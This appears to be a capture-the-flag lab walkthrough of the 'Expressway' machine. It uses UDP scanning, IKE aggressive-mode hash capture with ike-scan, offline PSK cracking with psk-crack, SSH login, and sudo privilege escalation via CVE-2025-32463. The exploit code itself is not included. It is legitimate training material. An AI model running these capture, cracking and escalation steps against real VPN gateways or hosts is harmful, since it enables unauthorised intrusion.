## Overview

![Expressway](/images/writeups/expressway/logo.png)

| Field | Details |
|---|---|
| **Machine** | Expressway |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Status** | Active |

> Walkthrough is sanitized, no flags or live secrets included.

## TL;DR

- UDP/500 open → IKE aggressive mode handshake → PSK hash captured
- `psk-crack` with rockyou.txt → plaintext PSK recovered
- SSH as `ike` user (identity from IKE response) → `user.txt`
- `sudo --version` → 1.9.17 → CVE-2025-32463 → root shell

## Tools Used

- nmap, ike-scan, psk-crack, ssh

## Setup / Notes

```
VM: Parrot
Run both TCP and UDP nmap scans. The key service is on UDP.
```

---

## Recon

```bash
nmap -sC -sV 10.129.211.69       # TCP
nmap -sU --top-ports 100 10.129.211.69  # UDP
```

```
22/tcp  open  ssh     OpenSSH 10.0p2 Debian 8
500/udp open  isakmp
```

Only two services: SSH and ISAKMP (IKE VPN). No web ports, no HTTP. The attack surface is the IKE service.

> **Why UDP matters**: IKE lives on UDP/500. A TCP-only scan would miss this entirely. Always run UDP scans.

## Enumeration

### IKE Aggressive Mode

IKE has two modes: Main Mode (identity protected) and Aggressive Mode (identity sent in cleartext + handshake hash exposed). Probe with ike-scan:

```bash
sudo ike-scan -A 10.129.211.69
```

```
Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.211.69 Aggressive Mode Handshake returned HDR=(CKY-R=a9ba19488d0dd2f6)
  SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
  KeyExchange(128 bytes) Nonce(32 bytes)
  ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
  VID=09002689dfd6b712 (XAUTH)
  VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
  Hash(20 bytes)

Ending ike-scan 1.9.5: 1 hosts scanned in 0.017 seconds (60.36 hosts/sec).
1 returned handshake; 0 returned notify
```

We observe the peer identity: `ike@expressway.htb`. Now run a targeted scan with that identity to capture the full PSK handshake hash:

```bash
sudo ike-scan -A -P ike@expressway.htb 10.129.211.69
```

```
Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.211.69 Aggressive Mode Handshake returned HDR=(CKY-R=99a2e5a5558973ca)
  SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
  KeyExchange(128 bytes) Nonce(32 bytes)
  ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
  VID=09002689dfd6b712 (XAUTH)
  VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
  Hash(20 bytes)

IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
<IKE_PSK_HASH_REDACTED>

Ending ike-scan 1.9.5: 1 hosts scanned in 0.017 seconds (60.52 hosts/sec).
1 returned handshake; 0 returned notify
```

We successfully captured the IKE PSK handshake hash ready for cracking. Save the hash and crack it. Note: use **psk-crack**, not hashcat or John, the format is specific to ISAKMP aggressive mode and is incompatible with standard password hash formats.

### Crack the PSK

```bash
psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt
```

```
key "<PASSWORD>" matches SHA1 hash <HASH>
Completed: 8045040 iterations in 4.9 seconds
```

PSK recovered. This becomes the SSH password for the `ike` user.

## Exploit

```bash
ssh ike@10.129.211.69
```

Logged in. Grab user flag:

## Privilege Escalation: CVE-2025-32463

Check sudo:

```bash
sudo --version
```

```
Sudo version 1.9.17
```

Sudo reports version 1.9.17. Search for public advisories affecting this version, **CVE-2025-32463** is a local privilege escalation vulnerability in sudo 1.9.17, with a public PoC available.

```bash
nano exploit.sh   # paste the PoC
chmod +x exploit.sh
./exploit.sh
```

Root shell spawned:

## Lessons Learned

- Never skip UDP scans: IKE, SNMP, TFTP, and DNS all live on UDP
- IKE aggressive mode leaks the peer identity and a crackable PSK hash, use Main Mode in production
- Always check `sudo --version` during local enum, even minor version differences can expose known CVEs
- `psk-crack` is the correct tool for ISAKMP PSK hashes; hashcat/John won't work with this format
